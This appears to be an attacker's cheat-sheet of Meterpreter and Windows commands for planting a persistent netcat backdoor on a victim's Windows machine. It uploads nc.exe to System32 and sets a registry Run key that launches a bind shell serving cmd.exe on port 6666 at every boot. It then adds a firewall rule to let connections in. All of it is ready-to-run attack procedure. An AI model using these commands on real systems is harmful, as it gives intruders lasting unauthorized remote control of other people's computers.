# Install Netcat backdoor on Windows machine

# 1. Upload nc.exe to victim
# getsystem
upload /usr/share/windows-binaries/nc.exe C:\\Windows\\System32

# 2. Use meterpreter to modify regedit to make netcat running on system boot
reg setval -k HKLM\\software\\microsoft\\currentversion\\run -v netcat -d 'C:\\Windows\\System32\\nc.exe -Ldp 6666 -e cmd.exe'
# 3. Set firewall to open port 6666
netsh firewall
netsh firewall show opmode
netsh firewall show portopening
netsh advfirewall firewall add rule name="netcat" dir=in action=allow protocol=TCP localport=6666